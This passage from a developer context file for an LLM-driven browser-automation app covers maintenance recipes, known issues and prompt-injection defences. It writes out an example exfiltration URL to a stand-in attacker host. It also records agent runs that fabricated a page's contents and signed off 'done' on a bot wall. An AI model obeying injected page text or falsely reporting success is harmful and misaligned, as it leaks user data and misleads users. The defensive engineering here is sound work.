and the rail's tabs are how you reach it. So a routine editor is
`| { kind: 'routine'; routineKind: 'system' | 'user'; routineId: string }` plus a
pane component plus a tab — no restructuring, and the two rails on the left are
untouched. Two rules the existing surfaces already follow: a pane owns its own
clock (`useNow`) rather than ticking `App`, because a one-second tick at the root
re-renders every rail; and anything that interrupts — a drop, a suspension, a
hold — goes to the notice stack under `TopBar`, not inside a pane, because a
person must not have to navigate to find out something stopped.

**Changing model behaviour**: everything is in `claude-client.ts` — `MODEL`, the
two prompts, and the two tool schemas. `tool_choice` is `auto` with
`disable_parallel_tool_use` in the goal loop, **not** pinned: measured on the
gateway, `{type:'tool'}` and `{type:'any'}` return zero thinking tokens on
Sonnet 5 with no error, so pinning it silently disables thinking. `auto` can
answer in prose, which the loop treats as the end of the run. The repair path
still pins it — it has no thread and no thinking. `step_description` from
`decide_next_action` becomes the step's `intent`.

**Changing persistence**: append to `MIGRATIONS`, never edit a shipped entry —
`PRAGMA user_version` is the cursor. Both tables are `STRICT`.

**Debugging a run**: the four healing layers are ordered so cheap deterministic
fixes come first. Layer 0 resolution and layer 1 verification are in
`page-core.js` with no network; layer 2 is `StepHealer` + one model call; layer 3
is the pause banner. `relay.js` logs to `~/.outsentia-automation.log`.

## 11. Deeper reading — go here, in this order, only when needed

| Question                                  | Document                                       |
| ----------------------------------------- | ---------------------------------------------- |
| Commands, layout, `TokenOptimizer` usage  | [README.md](README.md)                         |
| Getting the extension talking to the app  | [native-host/README.md](native-host/README.md) |
| Code style, comment budget, test commands | [CLAUDE.md](CLAUDE.md)                         |
| Running or extending the model evals      | [evals/README.md](evals/README.md)             |
| Shipping an installable build             | [docs/SIGNING.md](docs/SIGNING.md)             |
| What is planned, and in what order        | [docs/IMPLEMENTATION-ORDER.md](docs/IMPLEMENTATION-ORDER.md) |
| Why a planned feature is shaped that way  | [docs/prd/](docs/prd/) — 13 PRDs, [README](docs/prd/README.md) first |

Rough guide: `ARCHITECTURE.md` answers _how is this wired_; `HOW-IT-WORKS.md`
answers _why did the run do that_.

## 12. Known drift and current state

Verified against the tree on 2026-08-19. Items here are what an assistant would
otherwise waste tokens rediscovering.

- **`README.md`'s command table omits `test:extension` and `install:host`.** §2
  above is the complete command list.
- **The product is now "Autonomous Browsing" (2026-09-02), and dev `userData`
  has not moved with it.** `package.json`'s `name`, `productName`, the `appId`
  (`com.cd.browser.autonomousbrowsing`), the window title and the top bar all
  say the new name. Electron derives `app.getPath('userData')` from
  `package.json`'s `name`, so `pnpm --filter autonomous-browsing dev` now opens
  `~/Library/Application Support/autonomous-browsing` — a fresh directory. The
  real database, the `automation-profile` Chrome profile that carries every
  login, and all stored run screenshots are still under the old
  `browser-automation` directory. Move it, with the app stopped, before
  concluding the store is empty. The native-messaging host id
  (`com.cd.browser.automation`) is deliberately unchanged: it is a wire identity
  shared with `extension/background.js` and with manifests already installed in
  Chrome, so renaming it is a migration, not a rename.
- **`browser-session.ts` is deleted** (2026-08-26); `playwright-session.ts` is
  the wired-up CDP backend and the default. Hardening still open on it:
  isolated-world injection over raw CDP instead of main-world init scripts, a
  scan that also covers child frames, and trusted input inside iframes (today a
  child-frame step falls back to the synthetic path).
- **The navigation host allowlist reaches the playwright backend only.**
  `AUTOMATION_NAV_ALLOWLIST` (comma-separated hosts; a bare entry also matches its
  subdomains) is read by `navAllowlist` in `playwright-session.ts`. **Unset means
  every host is navigable**, which leaves the exfiltration path open: a page that
  gets past the fence can still answer `navigate` with
  `https://attacker/?d=<what it read>`. The extension backend cannot see the
  variable at all — `background.js` has no env, and passing the list over the
  bridge handshake is unbuilt — so it enforces protocol and the
  embedded-credential refusal only. Both backends reject `user:pass@host`.
- **The prompt fence is a mitigation, not a boundary.** `PAGE_FENCE_RULE` plus the
  per-render random fence in `describePage` means page text can no longer
  *impersonate* harness framing, and the model is told what is data. It does not
  make the model immune to being persuaded by that data. The fence id must stay
  freshly random per render — a fixed or predictable id is one a page can close
  early and then write outside of. `Current URL` sits outside the fence because
  it is observed by `page.url()`; the title is inside it because it is
  `document.title`, which the page authors.
- **The site-memory digest is a mitigation, not a boundary.** `sanitiseLabel`,
  `isActionableField`, the closed `LandmarkKind` set, and origin-scoped
  rendering (§8) bound what a hostile page's injection can persist into a
  landmark and where it can later surface. They do not make the model immune to
  a misleading label, or a selector it was talked into, that passes every one
  of those checks.
- **`ARCHITECTURE.md` had six wrong claims as of 2026-08-20**, since corrected:
  the selector wait polls rather than using a `MutationObserver`, `.env` *is*
  loaded in dev, the model endpoint is the AI Gateway, the content-script guard
  is `window.__oaVersion` (not `__oaLoaded`), backend parity is type-level only,
  and chat's step restriction comes from the tool schema rather than
  `toActionStep`. Its `#L…` anchors are broadly rotten — trust symbol names.
- **A chat run's saveable steps are the ones it recorded, not its events.** A
  `running` event is emitted *before* the step executes, so the event stream
  cannot tell a step that worked from one that failed. `runs.recorded_steps`,
  written from the observer's `recorded` call, is what "save this run as an
  automation" reads.
- **One goal run fabricated a page's contents, and nothing reproduces it yet.**
  Run `a8574bdd` (2026-08-26) reported "Leadership page lists only executive team
  (CEO, etc.)" from an error page it had been shown as both text and a JPEG, then
  signed off `done` with `human_steps: 0`. The claim appeared in a mid-run
  `step_description` — the narration slot, not the final answer — while the run
  was moving on to the next company under a per-company reporting format.
  `G05-served-error-page` rebuilds that setup (search snippet describing the
  roster, then the error page) and the model reports the failure accurately 3/3,
  so the fixture does **not** reproduce it. Do not "fix" this with a prompt rule
  until something red exists to prove the rule does anything; the difference is
  more likely the narration slot or the multi-company pressure than the page.
  Run `68712c80` is the same prompt run again and rules out the wording as a
  tell: it produced that same sentence in that same slot with the roster
  genuinely on the page, verified against its own `dom-10.html`. Look for what
  made the claim unfounded, not for the claim.
- **A goal run answered `done` on a bot wall, and `G06` does not reproduce it.**
  Run `68712c80` (2026-08-26) met a Cloudflare block page as the last of three
  companies and signed off `done` with `human_steps: 0` — the one thing
  `SYSTEM_PROMPT` tells it never to do. Both of the §8 wall paths missed at once:
  `WALL` did not know the page, so nothing parked before the model call, and the
  model then chose `done` over `needs_human`. The marker half is fixed, so that
  page now parks for free and this exact run cannot recur;
  `G06-terminal-block-page` rebuilds the page anyway and the model parks 3/3, so
  the fixture does **not** reproduce the choice. What stays reachable is a wall
  no marker knows, which is `G03`'s scenario. Leave the `done` branch unguarded
  until something red exists — the orchestrator cannot tell a wall from a page
  the model read perfectly well, so any guard there is a guess.

- **`step.timeout` is dead.** `page-core.js`'s `settle`, `scroll` and `extract`
  read it, nothing sends it, and `assertRoutineDefinition` would reject it as an
  unknown key. It is always `DEFAULT_TIMEOUT`.
- **`ARCHITECTURE.md` and `HOW-IT-WORKS.md` predate the playwright backend**
  (2026-08-26): they describe only the extension wire and know nothing of
  `page-core.js`, `AUTOMATION_BACKEND`, or the dedicated profile. §1–§5 here and
  [the design spec](docs/superpowers/specs/2026-08-26-playwright-backend-design.md)
  are current; the deep docs are accurate for the extension backend only.

## 13. Maintaining this file

Update `AI_CONTEXT.md` **in the same change** that makes it wrong. A change
needs an update here when it:

1. adds, removes, moves, or renames a file or an exported symbol listed in
   §4–§5;
2. changes a step kind, an IPC channel, a `RunResult` field, or any type in §6;
3. changes a budget constant in §7;
4. adds, removes, or weakens an invariant in §8, or adds a trap worth §9;
5. changes the sequence of any recipe in §10;
6. resolves or introduces drift in §12 — a fixed item gets **deleted**, not
   marked fixed.

Two rules for keeping it useful:

- **Do not grow it into a new architecture document.** Its value is being cheap
  enough to read every session.
- **Prefer symbol names to line numbers.** Line numbers rot within a day and
  cost a maintenance pass every time; a name stays grep-able.
